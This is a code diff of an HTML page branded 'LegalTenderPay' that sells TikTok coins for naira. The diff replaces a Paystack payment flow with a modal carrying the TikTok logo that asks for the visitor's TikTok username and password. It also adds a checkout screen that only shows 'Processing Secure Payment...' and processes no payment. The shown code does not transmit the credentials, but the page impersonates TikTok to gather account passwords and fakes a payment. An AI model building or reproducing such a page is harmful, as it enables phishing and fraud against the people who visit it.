@@ -1,12 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>LegalTenderPay</title>
-
-<!-- Paystack Inline Script -->
-<script src="https://js.paystack.co/v1/inline.js"></script>
 
 <style>
 body {
@@ -27,14 +25,14 @@ body {
   font-weight: 600;
 }
 
-/* Container */
+/* Container for everything */
 .container {
   max-width: 420px;
   margin: 0 auto;
   padding: 15px 20px 20px 20px;
 }
 
-/* Header */
+/* Header with logo */
 .header {
   display: flex;
   justify-content: space-between;
@@ -85,7 +83,7 @@ body {
   border-radius: 12px;
 }
 
-/* Coin grid */
+/* Coin boxes grid */
 .coins-grid {
   display: grid;
   grid-template-columns: repeat(3, 1fr);
@@ -144,7 +142,7 @@ body {
   margin-top: 10px;
 }
 
-/* Button */
+/* Main login/buy button */
 .login-btn {
   background-color: #ff375f;
   color: white;
@@ -158,7 +156,7 @@ body {
   margin-bottom: 25px;
 }
 
-/* Invite */
+/* Invite section */
 .invite-box {
   background-color: #fff;
   border-radius: 10px;
@@ -170,94 +168,144 @@ body {
   margin-bottom: 15px;
 }
 
-.invite-left { display: flex; align-items: center; }
-.invite-left img { width: 35px; margin-right: 10px; }
-.invite-text { font-size: 16px; font-weight: 600; }
-.invite-sub { color: #666; font-size: 13px; }
-.share-btn { font-size: 22px; color: #999; cursor: pointer; transition: 0.2s; }
+.invite-left {
+  display: flex;
+  align-items: center;
+}
+
+.invite-left img {
+  width: 35px;
+  margin-right: 10px;
+}
+
+.invite-text {
+  font-size: 16px;
+  font-weight: 600;
+}
+
+.invite-sub {
+  color: #666;
+  font-size: 13px;
+}
+
+.share-btn {
+  font-size: 22px;
+  color: #999;
+  cursor: pointer;
+  transition: 0.2s;
+}
 
 /* Coin image section */
-.coin-image-section { text-align: center; margin-top: 25px; }
-.coin-image-section img { width: 240px; border-radius: 12px; }
+.coin-image-section {
+  text-align: center;
+  margin-top: 25px;
+}
+
+.coin-image-section img {
+  width: 240px;
+  height: auto;
+  border-radius: 12px;
+  transition: 0.3s ease;
+}
 
 /* Footer */
-.footer { text-align: center; margin-top: 100px; opacity: 0.6; }
+.footer {
+  text-align: center;
+  margin-top: 100px;
+  opacity: 0.6;
+}
 
-/* Order Summary Modal */
-.order-summary {
+/* Loading & Login overlay */
+.loading-overlay, .login-modal {
   display: none;
   position: fixed;
-  z-index: 2000;
-  bottom: 0;
+  z-index: 1300;
   left: 0;
+  top: 0;
   width: 100%;
-  height: 55%;
+  height: 100%;
+  background: white;
+  justify-content: center;
+  align-items: center;
+}
+
+/* Loader animation */
+.loader {
+  width: 80px;
+  height: 80px;
+  position: relative;
+}
+
+.loader::before, .loader::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  width: 40px;
+  height: 80px;
+  border-radius: 50%;
+  animation: tikSpin 0.8s infinite;
+}
+
+.loader::before {
+  left: 0;
+  background: #25f4ee;
+}
+
+.loader::after {
+  right: 0;
+  background: #ff375f;
+  animation-delay: 0.4s;
+}
+
+@keyframes tikSpin {
+  0%, 100% { transform: scale(1); opacity: 0.9; }
+  50% { transform: scale(1.3); opacity: 0.5; }
+}
+
+/* Login modal */
+.login-content {
+  position: relative;
   background: #fff;
-  border-top-left-radius: 18px;
-  border-top-right-radius: 18px;
-  box-shadow: 0 -3px 10px rgba(0,0,0,0.15);
-  padding: 20px;
-  animation: slideUp 0.3s ease;
-}
-
-@keyframes slideUp {
-  from { transform: translateY(100%); }
-  to { transform: translateY(0); }
-}
-
-.order-summary h2 {
+  border-radius: 14px;
+  padding: 25px 20px;
+  box-shadow: 0 4px 18px rgba(0,0,0,0.12);
   text-align: center;
-  font-size: 20px;
-  margin-bottom: 5px;
+  width: 90%;
+  max-width: 380px;
 }
 
-.secure-pay {
-  text-align: center;
-  color: #007f5f;
-  font-weight: 600;
-  margin-bottom: 25px;
+.login-content h2 {
+  color: #000;
+  font-size: 22px;
+  margin-bottom: 8px;
 }
 
-.summary-row {
-  display: flex;
-  justify-content: space-between;
-  font-size: 16px;
-  padding: 8px 0;
-  border-bottom: 1px solid #f0f0f0;
-}
-
-.payment-method {
-  margin-top: 15px;
-  font-weight: bold;
-  font-size: 16px;
-}
-
-.notice-text {
-  margin-top: 15px;
-  font-size: 13px;
+.login-content p {
   color: #666;
-  line-height: 1.5;
+  font-size: 14px;
+  margin-bottom: 20px;
 }
 
-.total-row {
-  display: flex;
-  justify-content: space-between;
-  margin-top: 10px;
-  font-weight: 700;
-  font-size: 17px;
+.login-content input {
+  width: 85%;
+  padding: 12px;
+  margin: 8px 0;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  font-size: 15px;
 }
 
-.pay-now {
-  margin-top: 20px;
-  width: 100%;
-  background-color: #ff375f;
-  color: white;
-  padding: 14px;
+.login-content button {
+  background: #ff375f;
+  color: #fff;
   border: none;
-  border-radius: 10px;
-  font-size: 17px;
+  padding: 12px;
+  border-radius: 8px;
+  cursor: not-allowed;
+  width: 88%;
   font-weight: bold;
-  cursor: pointer;
+  font-size: 16px;
+  opacity: 0.6;
 }
 </style>
 </head>
@@ -281,67 +329,166 @@ body {
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">30</div>
       <div class="coin-price">₦530</div>
     </div>
+    <div class="coin-box" data-coins="350" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
+      <div class="coin-price">₦6,200</div>
+    </div>
+    <div class="coin-box" data-coins="700" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">700</div>
+      <div class="coin-price">₦12,400</div>
+    </div>
+    <div class="coin-box" data-coins="1400" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">1,400</div>
+      <div class="coin-price">₦24,700</div>
+    </div>
     <div class="coin-box" data-coins="3500" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3500</div>
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3,500</div>
       <div class="coin-price">₦61,985</div>
+    </div>
+    <div class="coin-box" data-coins="custom" onclick="selectCustom(this)">
+      <span class="coin-amount">Custom</span>
     </div>
   </div>
 
-  <button class="login-btn" id="mainButton" onclick="showOrderSummary()">Buy 3500 Coins for ₦61,985</button>
+  <div class="custom-input" id="customInputBox">
+    <input type="number" id="customAmount" placeholder="Enter coins amount" oninput="updateCustomAmount()">
+  </div>
 
-  <div class="footer"><div class="legal">LegalTenderPay</div></div>
+  <button class="login-btn" id="mainButton" onclick="startLogin()">Log in to get Coins</button>
+
+  <div class="invite-box">
+    <div class="invite-left">
+      <img src="https://cdn-icons-png.flaticon.com/512/12749/12749038.png" alt="invite">
+      <div>
+        <div class="invite-text">Invite & Get Rewards</div>
+        <div class="invite-sub">Check out this new feature!</div>
+      </div>
+    </div>
+    <span class="share-btn" onclick="alert('Share this link manually!')">&#62;</span>
+  </div>
+
+  <div class="coin-image-section">
+    <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/70a854a7-f718-447f-9176-6ea7a74ff63e.jpeg" alt="LegalTenderPay Coin">
+  </div>
+
+  <div class="footer">
+    <div class="legal">LegalTenderPay</div>
+  </div>
 </div>
 
-<!-- ✅ Order Summary Modal -->
-<div class="order-summary" id="orderSummary">
-  <h2>Order Summary</h2>
-  <div class="secure-pay">Secure Payment ></div>
+<!-- Loading overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loader"></div>
+</div>
 
-  <div class="summary-row">
-    <span>Total Coin Purchase</span>
-    <span>3500 Coins</span>
+<!-- Login modal -->
+<div class="login-modal" id="loginModal">
+  <div class="login-content">
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
+         alt="TikTok Logo"
+         style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
+    <h2 style="margin-top: 20px;">Log in to get Coins</h2>
+    <p>Log in to your TikTok account to get Coins, check notifications and more.</p>
+    <input type="text" id="usernameInput" placeholder="Username" required><br>
+    <input type="password" id="passwordInput" placeholder="Password" required><br>
+    <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
-  <div class="summary-row">
-    <span>Amount</span>
-    <span>₦61,985</span>
-  </div>
-
-  <div class="payment-method">Payment Method</div>
-  <p style="margin-top:5px;">Paystack</p>
-
-  <p class="notice-text">
-    By tapping Pay now to make a purchase, you acknowledge that you are purchasing a limited license to access this.
-  </p>
-
-  <div class="total-row">
-    <span>Total</span>
-    <span>₦61,985</span>
-  </div>
-
-  <button class="pay-now" onclick="payWithPaystack()">Pay Now</button>
 </div>
 
 <script>
-function showOrderSummary() {
-  document.getElementById('orderSummary').style.display = 'block';
+let coinRate = 17.71;
+let selectedCoins = 30;
+let loggedIn = false;
+
+function formatCurrency(amount) {
+  return '₦' + Math.round(amount).toLocaleString('en-NG');
 }
 
-// ✅ Paystack inline modal
-function payWithPaystack() {
-  let handler = PaystackPop.setup({
-    key: 'pk_live_05d5fe8301b202427f3d3a9b26059269ddd1c00f',
-    email: 'legaltenderpay@gmail.com',
-    amount: 6198500, // amount in kobo
-    currency: 'NGN',
-    callback: function(response) {
-      alert('Payment Successful — Coins will be sent shortly.');
-    },
-    onClose: function() {
-      alert('Payment window closed.');
-    }
-  });
-  handler.openIframe();
+function selectBox(el) {
+  document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  selectedCoins = parseInt(el.getAttribute('data-coins')) || 0;
+  document.getElementById("customInputBox").style.display = "none";
+  updateButton();
 }
+
+function selectCustom(el) {
+  document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById("customInputBox").style.display = "block";
+  selectedCoins = 0;
+  updateButton();
+}
+
+function updateCustomAmount() {
+  const val = parseInt(document.getElementById("customAmount").value);
+  selectedCoins = val > 0 ? val : 0;
+  updateButton();
+}
+
+function updateButton() {
+  const btn = document.getElementById("mainButton");
+  if (loggedIn) {
+    if (selectedCoins > 0) {
+      const ngn = formatCurrency(selectedCoins * coinRate);
+      btn.textContent = `Buy ${selectedCoins} Coins for ${ngn}`;
+    } else {
+      btn.textContent = "Buy Now";
+    }
+  }
+}
+
+function startLogin() {
+  if (!loggedIn) {
+    document.getElementById("loadingOverlay").style.display = "flex";
+    setTimeout(() => {
+      document.getElementById("loadingOverlay").style.display = "none";
+      document.getElementById("loginModal").style.display = "flex";
+    }, 2000);
+  } else {
+    const amount = formatCurrency(selectedCoins * coinRate);
+    document.body.innerHTML = `
+      <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:Arial;text-align:center;">
+        <h1 style="color:#ff375f;">LegalTenderPay Checkout</h1>
+        <p style="font-size:18px;">You are buying <strong>${selectedCoins} Coins</strong></p>
+        <p style="font-size:20px;font-weight:bold;">Amount: ${amount}</p>
+        <p style="margin-top:30px;">Processing Secure Payment...</p>
+      </div>`;
+  }
+}
+
+/* ✅ Updated Complete Login Function */
+function completeLogin() {
+  // Show loading animation for 2 seconds before going to next page
+  document.getElementById("loginModal").style.display = "none";
+  document.getElementById("loadingOverlay").style.display = "flex";
+
+  setTimeout(() => {
+    document.getElementById("loadingOverlay").style.display = "none";
+    loggedIn = true;
+    updateButton();
+  }, 2000);
+}
+
+/* Username + Password field listener */
+const usernameField = document.getElementById("usernameInput");
+const passwordField = document.getElementById("passwordInput");
+const continueBtn = document.getElementById("continueBtn");
+
+function checkLoginFields() {
+  if (usernameField.value.trim() && passwordField.value.trim()) {
+    continueBtn.disabled = false;
+    continueBtn.style.opacity = "1";
+    continueBtn.style.cursor = "pointer";
+  } else {
+    continueBtn.disabled = true;
+    continueBtn.style.opacity = "0.6";
+    continueBtn.style.cursor = "not-allowed";
+  }
+}
+
+usernameField.addEventListener("input", checkLoginFields);
+passwordField.addEventListener("input", checkLoginFields);
 </script>
 </body>
 </html>
